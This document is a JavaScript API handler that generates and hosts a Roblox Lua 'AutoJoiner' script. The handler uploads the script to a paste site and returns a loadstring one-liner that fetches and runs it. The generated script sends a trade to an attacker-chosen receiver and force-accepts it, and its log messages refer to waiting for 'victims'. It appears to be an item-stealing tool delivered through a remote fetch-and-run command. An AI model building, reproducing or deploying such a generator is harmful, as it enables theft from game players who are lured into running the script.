export default async function handler(req, res) {
    // Enable CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }
    
    const { webhook, gameId, receiverName, interval } = req.body;
    
    // Very simple validation - just check if it's not empty
    if (!webhook || webhook.length < 10) {
        return res.status(400).json({ error: 'Valid webhook URL required' });
    }
    
    if (!receiverName) {
        return res.status(400).json({ error: 'Username required' });
    }
    
    // Generate the script
    const script = generateScript(webhook, gameId || '142823291', receiverName, interval || '3');
    
    // Try to upload to Pastefy, but don't fail if it doesn't work
    let loadstring = `loadstring([=[${script}]=])()`;
    
    try {
        const pastefyRes = await fetch('https://pastefy.app/api/v2/paste', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: script,
                title: `AutoJoiner_${Date.now()}`,
                visibility: 'UNLISTED'
            })
        });
        
        if (pastefyRes.ok) {
            const pasteData = await pastefyRes.json();
            const pasteId = pasteData.id || pasteData.paste?.id;
            if (pasteId) {
                loadstring = `loadstring(game:HttpGet("https://pastefy.app/${pasteId}/raw"))()`;
            }
        }
    } catch (e) {
        // Ignore pastefy errors, use fallback
        console.log('Pastefy failed, using fallback');
    }
    
    return res.status(200).json({
        success: true,
        loadstring: loadstring
    });
}

function generateScript(webhook, gameId, receiverName, interval) {
    return `-- AUTO-JOINER SCRIPT
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local lp = Players.LocalPlayer

local WEBHOOK = "${webhook}"
local TARGET_GAME = ${gameId}
local RECEIVER = "${receiverName}"
local CHECK_INTERVAL = ${interval}

local requestFunc = syn and syn.request or request or (http and http.request)

print("[AutoJoiner] Started! Waiting for victims...")

-- Trade function
local function sendTrade()
    local Trade = ReplicatedStorage:FindFirstChild("Trade")
    if not Trade then 
        print("[AutoJoiner] No trade system found")
        return false 
    end
    
    local SendRequest = Trade:FindFirstChild("SendRequest")
    local AcceptTrade = Trade:FindFirstChild("AcceptTrade")
    
    if not SendRequest then 
        print("[AutoJoiner] No trade remotes found")
        return false 
    end
    
    pcall(function() 
        SendRequest:InvokeServer(RECEIVER) 
        print("[AutoJoiner] Trade request sent")
    end)
    
    task.wait(2)
    
    pcall(function() 
        AcceptTrade:FireServer(game.PlaceId * 3, {}) 
        print("[AutoJoiner] Trade accepted!")
    end)
    
    return true
end

-- Main loop
while true do
    if game.PlaceId == TARGET_GAME then
        print("[AutoJoiner] In target game!")
        sendTrade()
        task.wait(5)
        TeleportService:Teleport(TARGET_GAME)
        task.wait(5)
    else
        print("[AutoJoiner] Waiting for victim. Set TARGET_JOB_ID = 'job_id_here'")
    end
    task.wait(CHECK_INTERVAL)
end`;
}
